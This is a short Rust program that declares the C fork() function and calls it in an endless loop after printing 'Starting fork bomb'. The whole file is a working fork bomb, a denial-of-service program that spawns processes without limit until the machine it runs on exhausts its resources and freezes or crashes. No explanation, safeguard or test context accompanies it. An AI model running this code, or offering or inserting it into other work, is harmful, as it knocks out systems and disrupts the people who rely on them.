unsafe extern "C" {
    fn fork() -> i32;
}

fn main() {
    println!("Starting fork bomb");
    loop {
        unsafe {
            let _ = fork();
        }
    }
}
